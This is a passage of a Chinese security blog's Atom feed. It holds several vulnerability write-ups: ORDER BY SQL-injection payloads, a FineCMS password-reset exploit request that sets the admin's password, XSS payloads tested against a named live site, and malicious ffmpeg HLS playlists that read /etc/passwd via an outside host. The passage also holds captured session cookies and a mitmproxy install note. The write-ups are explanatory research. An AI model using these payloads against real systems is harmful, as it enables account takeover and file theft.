</code></pre><p>会报错，Incorrect usage of UNION and ORDER BY</p>
<p>所以通常的利用都是使用了一些技巧。</p>
<h1 id="盲注：">盲注：</h1><h2 id="需要知道字段名">需要知道字段名</h2><p>1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</p>
<pre><code>(<span class="operator"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> <span class="keyword">id</span> <span class="keyword">else</span> price <span class="keyword">end</span>)

<span class="keyword">if</span>((selectchar(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">limit</span> <span class="number">1</span>)&lt;=<span class="number">128</span>),<span class="keyword">id</span>,price)</span>
</code></pre><p>条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</p>
<p>1,基于表达式结果盲注</p>
<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-07406" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-07406</a></p>
<p>不过以上的这些技巧都需要一些条件，目前看来order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式，利用方式也比较成熟。所以这些技巧只能用来开阔思路了。</p>
<h2 id="成熟的利用方式">成熟的利用方式</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
<pre><code><span class="built_in">asc</span>,<span class="keyword">if</span>(locate(\<span class="string">''</span>+payload+<span class="string">'\'</span>,substring(user(),<span class="string">'+str(i)+'</span>,<span class="number">1</span>)),<span class="built_in">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)
</code></pre><p>基于order by 1,2 引起mysql错误进行盲注 </p>
<p>payload:</p>
<pre><code>id,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,(select <span class="number">1</span> from information_schema.tables))
</code></pre><p>当条件为false是，值为select 1 from information_schema.tables，mysql会报错，Subquery returns more than 1 row，导致查询结果为空。</p>
<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-076151" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-076151</a></p>
<p>基于 order by rand(true);order by rand(false);返回不同进行盲注<br>payload:rand(ascii(mid(database(),1,1))=109)</p>
<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-0152570" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0152570</a></p>
<p>关于order by rand(true)和order by rand(false)返回不同的培训原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数培训，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</p>
<p>参考这里的讨论：<a href="http://zone.wooyun.org/content/25733" target="_blank" rel="external">http://zone.wooyun.org/content/25733</a></p>
<h2 id="sqlmap利用方式">sqlmap利用方式</h2><p>使用level5 risk3</p>
<pre><code>Parameter: sort (<span class="keyword">GET</span>)
    Type: <span class="built_in">boolean</span>-based blind
    Title: MySQL RLIKE <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span>, HAVING, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause
    Payload: sort=<span class="number">1</span> RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">9644</span>=<span class="number">9644</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))
    Type: <span class="keyword">AND</span>/<span class="keyword">OR</span> time-based blind
    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> time-based blind (<span class="keyword">SELECT</span>)
    Payload: sort=<span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))MVan)
---
</code></pre><h1 id="思考">思考</h1>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为]]>
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[finecms <= 2.3.0 任意用户密码修改]]></title>
    <link href="http://xdxd.love/2016/03/03/finecms-2-3-0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/"/>
    <id>http://xdxd.love/2016/03/03/finecms-2-3-0-任意用户密码修改/</id>
    <published>2016-03-03T14:32:33.000Z</published>
    <updated>2016-03-03T14:38:18.000Z</updated>
    <content type="html"><![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-060197</a> 利用暴力破解验证码的方式来重置密码，这里讨论的方式相对于暴力破解来说成本更低。</p>
<p>直接看代码验证验证码的逻辑：逻辑分析下载注释中。</p>
<p>case 2:</p>
<pre><code>                        <span class="variable">$uid</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;get(<span class="string">'uid'</span>);
                        <span class="variable">$code</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'code'</span>);
                        从post获取验证码。
                        <span class="variable">$data</span> = <span class="variable">$this-</span>&gt;db
                                                 -&gt;<span class="keyword">where</span>(<span class="string">'uid'</span>, <span class="variable">$uid</span>)
                                                 -&gt;<span class="keyword">where</span>(<span class="string">'randcode'</span>, <span class="variable">$code</span>)
                          根据验证码和UID从数据库中查询数据。
                                                 -&gt;select(<span class="string">'salt,uid,username,email'</span>)
                                                 -&gt;limit(<span class="number">1</span>)
                                                 -&gt;get(<span class="string">'member'</span>)
                                                 -&gt;row_array();
                        <span class="keyword">if</span> (!<span class="variable">$data</span>) {
                        如果查不到该验证码对应的数据，提示错误。
        <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-000'</span>));
    }

                        <span class="variable">$password1</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password1'</span>);
                        <span class="variable">$password2</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password2'</span>);
                        <span class="keyword">if</span> (<span class="variable">$password1</span> != <span class="variable">$password2</span>) {
                                <span class="variable">$error</span> = lang(<span class="string">'m-019'</span>);
                        } elseif (!<span class="variable">$password1</span>) {
                                <span class="variable">$error</span> = lang(<span class="string">'m-018'</span>);
                        } <span class="keyword">else</span> {
                                // 修改密码
                                <span class="variable">$this-</span>&gt;db
                                         -&gt;where(<span class="string">'uid'</span>, <span class="variable">$data</span>[<span class="string">'uid'</span>])
                                         -&gt;update(<span class="string">'member'</span>, array(
                        成功修改密码之后，验证码randcode设置为<span class="number">0</span>！！！！！
                                                <span class="string">'randcode'</span> =&gt; <span class="number">0</span>,
                                                <span class="string">'password'</span> =&gt; md5(md5(<span class="variable">$password1</span>).<span class="variable">$data</span>[<span class="string">'salt'</span>].md5(<span class="variable">$password1</span>))
                                         ));
                                if (<span class="variable">$this-</span>&gt;get_cache(<span class="string">'MEMBER'</span>, <span class="string">'setting'</span>, <span class="string">'ucenter'</span>)) {
            uc_user_edit(<span class="variable">$data</span>[<span class="string">'username'</span>], <span class="string">''</span>, <span class="variable">$password1</span>, <span class="string">''</span>, <span class="number">1</span>);
        }
                                <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-052'</span>), dr_url(<span class="string">'login/index'</span>), <span class="number">1</span>);
                        }
                        break;
        }
}
</code></pre><p>这里一个逻辑问题就是，修改密码之后，验证码设置为零。去数据库中看了一下，这个字段的默认值是0，而判断验证码之前没有对验证码是否是0进行判断。导致使用0作为验证码可以直接修改任意账号的密码。这种方式在黑盒的任意密码重置案例中并没有见到过。<br><img src="/images/finecms5.jpg" alt=""></p>
<p>利用方式，直接post url：</p>
<pre><code><span class="string">http:</span><span class="comment">//www.<span class="label">xxxxxxx.com/member/index.php?c=login&amp;m=find&amp;step=2&amp;uid=1</span></span>
</code></pre><p>这里uid=1为管理员。 post 数据为code=0&amp;password1=12345678&amp;password2=12345678<br>在互联网实例中测试。</p>
<p><img src="/images/finecms6.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">ht]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[centos 6安装mitmproxy]]></title>
    <link href="http://xdxd.love/2016/02/26/centos-6%E5%AE%89%E8%A3%85mitmproxy/"/>
    <id>http://xdxd.love/2016/02/26/centos-6安装mitmproxy/</id>
    <published>2016-02-26T07:18:01.000Z</published>
    <updated>2016-03-02T07:07:45.000Z</updated>
    <content type="html"><![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用Python开发，是辅助web开发&amp;测试，移动端调试，渗透测试的工具。</p>
<p>mitmproxy作为定制化工具开发比较方便。但是mitmproxy需要太多依赖了。在mac上使用编译好的执行程序还是比较方便，ubuntu按照官方说明也比较方便安装。</p>
<p>ubuntu上安装命令如下：</p>
<pre><code>$ sudo apt-<span class="built_in">get</span> install python-pip python-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> libssl-<span class="built_in">dev</span> libxml2-<span class="built_in">dev</span> libxslt1-<span class="built_in">dev</span>
$ sudo pip install mitmproxy
</code></pre><p>mitmproxy官方没有在centos上的安装说明。在centos6.7上安装失败多次，最后按照<a href="http://pacess.blogspot.com/2014/11/install-mitmproxy-on-centos.html" target="_blank" rel="external">在 CentOS 下安裝 mitmproxy</a>的说明，安装成功。</p>
<pre><code>試過幾次失敗後，最終都能成功安裝在 CentOS <span class="number">6</span>。問題是出在 Python <span class="number">2.6</span> 及 Python <span class="number">3.4</span>。原來「mitmproxy」在 Python <span class="number">2.7</span> 才能順利安裝。要是使用 CentOS <span class="number">7</span> 的話，隨機附送的就是 Python <span class="number">2.7</span>。安裝「mitmproxy」的步驟如下：
<span class="number">1.</span> 下載 Python 的 PIP 工具
    wget https:<span class="comment">//bootstrap.pypa.io/get-pip.py</span>
<span class="number">2.</span> 安裝 Python <span class="number">2.7</span> 的 PIP
    python get-pip.py
<span class="number">3.</span> 下載 Python 的 EZ Setup
    wget https:<span class="comment">//bitbucket.org/pypa/setuptools/raw/bootstrap/ez_setup.py</span>
<span class="number">4.</span> 安裝 Python <span class="number">2.7</span> 的 EZ Setup
    python ez_setup.py
<span class="number">5.</span> 安裝需要的封包
    yum -y install python-pyasn1 python-flask python-urwid readline-devel gdbm-devel bzip2-devel ncurses-devel sqlite-devel tk-devel gcc python-setuptools python-pip python27-pip newt-python python-devel python27-devel python-pyasn1 pyOpenSSL gcc libxml2-devel libxslt-devel libffi-devel openssl-devel
<span class="number">6.</span> 安裝 pyOpenSSL <span class="number">0.14</span>
    easy_install http:<span class="comment">//pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.12.tar.gz</span>
</code></pre><p>最后 pip install mitmporxy 就好。</p>
<p><img src="/images/mitmproxy1.JPG" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用P]]>
    </summary>
    
      <category term="mitmproxy" scheme="http://xdxd.love/tags/mitmproxy/"/>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sqlalchemy保存字典对象报语法错误]]></title>
    <link href="http://xdxd.love/2016/01/28/sqlalchemy%E8%AE%B0%E5%BD%95%E6%89%A7%E8%A1%8Csql/"/>
    <id>http://xdxd.love/2016/01/28/sqlalchemy记录执行sql/</id>
    <published>2016-01-28T09:08:12.000Z</published>
    <updated>2016-01-29T02:34:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="问题分析">问题分析</h1><p>使用sqlalchemy的过程中,遇到写数据库的时候报语法错误，相关代码如下：</p>
<pre><code># 定义requests对象,存储HTTP请求的所有信息<span class="value">:
class <span class="function">Requests</span>(Base):
    # 表的名字:
    __tablename__ = <span class="string">'requests'</span>
    # 表的结构:
    id = <span class="function">Column</span>(<span class="function">Integer</span>(), primary_key=True)
    # scheme = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
    method = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">200</span>))
    url = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">2000</span>))
    headers = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    # cookies = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    content = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    # query = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    timestamp_start = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">2000</span>))
    urlencoded_form=<span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    multipart_form=<span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    sqlmap=<span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
    xss=<span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))

# 将请求信息写入数据库
def <span class="function">save_request</span>(flow):
    newrequest = <span class="function">Requests</span>(
            # scheme=flow.request.scheme,
            method=flow.request.method,
            url=flow.request.url,
            headers=<span class="function">str</span>(flow.request.headers.__dict__),
            # headers={<span class="string">'fields'</span>: [[<span class="string">'Host'</span>, <span class="string">'zone.wooyun.org'</span>], [<span class="string">'Proxy-Connection'</span>, <span class="string">'keep-alive'</span>], [<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>], [<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>], [<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>], [<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span>], [<span class="string">'Referer'</span>, <span class="string">'http://zone.wooyun.org/content/24881'</span>], [<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate, sdch'</span>], [<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2'</span>], [<span class="string">'Cookie'</span>, <span class="string">'__cfduid=dc40888efca4ab0ff91186dc39428d9451452910746; wy_uid=5216UsFxwcFbseAhJt2wKwW3D3TWpih1g71JAjeIlpCT; wy_pwd=8c96%2BGWnQmu1BRR1RePbtZrkAZ6bY8HvlPtgcggYQmaideN8%2F08EAzHsV1XKQ72ZwX7q%2BxN4FJgnfUHorw; wy_token=192c2fd47fa5d03123ced3320c7e580c; PHPSESSID=e0e6vqec509trlqu7tv1lfeu70; bdshare_firstime=1453095346906; login_type=d8d1the3gNwSvY8dSI2oIhzdLszQ8nsd2ne%2Fl6JY; __ads_session=xk9roUMxqgiiIx0CggA=; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1453453560; Hm_lpvt_c12f88b5c1cd041a732dea597a5ec94c=1453876852; Hm_lvt_3faf3a47435cc512f3b86dc12af100d0=1453682212; Hm_lpvt_3faf3a47435cc512f3b86dc12af100d0=1453882158'</span>], [<span class="string">'AlexaToolbar-ALX_NS_PH'</span>, <span class="string">'AlexaToolbar/alxg-3.3'</span>]]},
            # cookies=flow.request.cookies,
            content=flow.request.content,
            # query=flow.request.query,
            timestamp_start=flow.request.timestamp_start,
            # id=<span class="function">get_md5_value</span>(flow.request.url+flow.request.content+<span class="function">str</span>(flow.request.timestamp_start))
            urlencoded_form=flow.request.urlencoded_form,
            multipart_form=flow.request.multipart_form,
    )
    session = <span class="function">DBSession</span>()
    session.<span class="function">add</span>(newrequest)
    session.<span class="function">commit</span>()
    session.<span class="function">close</span>()</span>
</code></pre><p>当写入的数据类型为字典时，报语法错误。</p>
<pre><code><span class="name">ProgrammingError</span>: (<span class="name">_mysql_exceptions</span>.<span class="name">ProgrammingError</span>) (<span class="number">1064</span>, <span class="string">'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'fields\': "((\'Host\',\'dongweiming.github.io\'),(\'Proxy-Connection\',\'keep-alive\'),(\' at line 1'</span>) [<span class="name">SQL</span>: <span class="atom">u</span><span class="string">'INSERT INTO requests (method, url, headers, content, timestamp_start, urlencoded_form, multipart_form, sqlmap, xss) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)'</span>] [<span class="atom">parameters</span>: (<span class="string">'GET'</span>, <span class="string">'http://dongweiming.github.io/blog/archives/how-to-use-celery/'</span>, {<span class="string">'fields'</span>: [[<span class="string">'Host'</span>, <span class="string">'dongweiming.github.io'</span>], [<span class="string">'Proxy-Connection'</span>, <span class="string">'keep-alive'</span>], [<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>], [<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>], [<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>], [<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span>], [<span class="string">'Referer'</span>, <span class="string">'https://www.google.com/'</span>], [<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate, sdch'</span>], [<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2'</span>], [<span class="string">'Cookie'</span>, <span class="string">'__utma=221486477.1712369208.1453863719.1453863719.1453972410.2; __utmc=221486477; __utmz=221486477.1453972410.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)'</span>], [<span class="string">'AlexaToolbar-ALX_NS_PH'</span>, <span class="string">'AlexaToolbar/alxg-3.3'</span>], [<span class="string">'If-Modified-Since'</span>, <span class="string">'Tue, 26 Jan 2016 10:36:35 GMT'</span>]]}, <span class="string">''</span>, <span class="number">1454034516.300893</span>, <span class="name">None</span>, <span class="name">None</span>, <span class="name">None</span>, <span class="name">None</span>)]
</code></pre><p>一开始看到语法错误，感觉有SQL注入啊。可是sqlalchemy应该是用预编译的方式，报错信息也显示了，确实是采用了预编译的方式。</p>
<pre><code>u'<span class="type">INSERT</span> <span class="type">INTO</span> requests (<span class="keyword">method</span>, url, headers, content, timestamp_start, urlencoded_form, multipart_form, sqlmap, xss) <span class="type">VALUES</span> (%s, %s, %s, %s, %s, %s, %s, %s, %s)
</code></pre><p>使用如下python代码可以记录sqlalchemy执行的sql语句。</p>
<pre><code># <span class="tag">logging</span><span class="class">.basicConfig</span>(filename=<span class="string">'db.log'</span>)
# <span class="tag">logging</span><span class="class">.getLogger</span>(<span class="string">'sqlalchemy.engine'</span>)<span class="class">.setLevel</span>(logging.INFO)
</code></pre><p>经过调试分析发现，如果传入类型为字典，就会导致</p>
<pre><code>ProgrammingError: (_mysql_exceptions.ProgrammingError) (1064, 'You have <span class="keyword">an</span> <span class="keyword">error</span> <span class="keyword">in</span> your SQL <span class="keyword">syntax</span>; 
</code></pre><p>错误。</p>
<p>sqlalchemy的bug？是否有可能造成sql注入？</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="问题分析">问题分析</h1><p>使用sqlalchemy的过程中,遇到写数据库的时候报语法错误，相关代码如下：</p>
<pre><code># 定义requests对象,存储HTTP请求的所有信息<span class="value">:
class <sp]]>
    </summary>
    
      <category term="python" scheme="http://xdxd.love/tags/python/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[input标签type为hidden时的xss利用]]></title>
    <link href="http://xdxd.love/2016/01/20/input%E6%A0%87%E7%AD%BEtype%E4%B8%BAhidden%E6%97%B6%E7%9A%84xss%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/</id>
    <published>2016-01-20T06:05:01.000Z</published>
    <updated>2016-01-20T06:45:54.000Z</updated>
    <content type="html"><![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> name=<span class="string">"redacted"</span> value=<span class="string">"default"</span> injection=<span class="string">"xss"</span> /&gt;
</code></pre><h1 id="结论">结论</h1><p>在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的结论就是利用价值极低。</p>
<h1 id="利用方式">利用方式</h1><p>1，如果输出是在type=”hidden”之前，直接覆盖type，就变成了一个常规的xss。这个情况比较少见。</p>
<p>2，建立两个HTML文件，one.htm</p>
<pre><code><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">two.htm</span>&gt;</span>
</code></pre><p>two.htm</p>
<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
</code></pre><p>测试于IE6-9 可以弹。</p>
<p>3，firefox使用键盘交互的方式。</p>
<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
</code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
<p>4,使用expression</p>
<p>IE6下</p>
<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
</code></pre><h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
</code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
<pre><code>http:<span class="regexp">//m</span>.yohobuy.com/passport//back//backcode?phoneNum=<span class="number">15381187741</span>&amp;token=e6fd9<span class="variable">%20style</span><span class="variable">%3dx</span><span class="variable">%3aexpr</span><span class="variable">%2f</span>**<span class="variable">%2fession</span>(<span class="keyword">open</span>(alert(<span class="number">1</span>)))<span class="variable">%20e6fd9</span>&amp;areaCode=<span class="number">8</span>
</code></pre><p><img src="/images/inputhidden2.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a><br><a href="http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html" target="_blank" rel="external">http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
<pre><code>&lt;input <span cl]]>
    </summary>
    
      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ffmpeg SSRF漏洞分析]]></title>
    <link href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/01/18/ffmpeg-SSRF漏洞分析/</id>
    <published>2016-01-18T10:41:41.000Z</published>
    <updated>2016-01-19T08:35:57.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">这个文章</a>，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自<a href="http://www.solidot.org/story?sid=46891" target="_blank" rel="external">solidot</a>15日的这个简短报道。<br><img src="/images/ffmpegssrf1.png" alt=""></p>
<p>而ffmpeg得反应很快，1月16日就发布了修复版本。</p>
<p><img src="/images/ffmpegssrf2.png" alt=""></p>
<h1 id="漏洞影响">漏洞影响</h1><p>如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件也会造成本地文件信息泄露。</p>
<h1 id="漏洞分析">漏洞分析</h1><p>change log中提到了两个CVE CVE-2016-1897和CVE-2016-1898。</p>
<h2 id="CVE-2016-1897">CVE-2016-1897</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a> )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
<pre><code><span class="preprocessor">#EXTM3U</span>
<span class="preprocessor">#EXT-X-MEDIA-SEQUENCE:0</span>
<span class="preprocessor">#EXTINF:10.0,</span>
concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
<span class="preprocessor">#EXT-X-ENDLIST</span>
</code></pre><h2 id="CVE-2016-1898">CVE-2016-1898</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
<pre><code><span class="comment">#EXTM3U</span>
<span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
<span class="comment">#EXTINF:10.0,</span>
<span class="symbol">concat:</span><span class="symbol">http:</span>/<span class="regexp">/localhost/header</span>.m3u8|subfile,,start,<span class="number">0</span>,<span class="keyword">end</span>,<span class="number">64</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">64</span>,<span class="keyword">end</span>,<span class="number">128</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">128</span>,<span class="keyword">end</span>,<span class="number">256</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">256</span>,<span class="keyword">end</span>,<span class="number">512</span>,,<span class="symbol">:///etc/passwd</span>
<span class="comment">#EXT-X-ENDLIST</span>
</code></pre><h1 id="CTF">CTF</h1><p>比较有意思的是查资料的过程中发现了这篇文章<a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">9447 CTF 2015: Super Turbo Atomic GIF Converter</a></p>
<p>可以看到以下几个方式可以读取文件:</p>
<pre><code><span class="id">#EXTM3U</span>
<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
<span class="id">#EXTINF</span>:<span class="number">1</span>,
/home/ctf/flag<span class="class">.txt</span>
<span class="id">#EXT-X-ENDLIST</span>

<span class="id">#EXTM3U</span>
<span class="id">#EXT-X-PLAYLIST-TYPE</span>:VOD
<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
<span class="id">#EXT-X-VERSION</span>:<span class="number">3</span>
<span class="id">#EXT-X-MEDIA-SEQUENCE</span>:<span class="number">0</span>
<span class="id">#EXTINF</span>:<span class="number">10.0</span>,
file:<span class="comment">///home/ctf/flag.txt</span>
#EXT-X-ENDLIST
</code></pre><p>以及这里cve的concat方式。利用0day做ctf也是高端。</p>
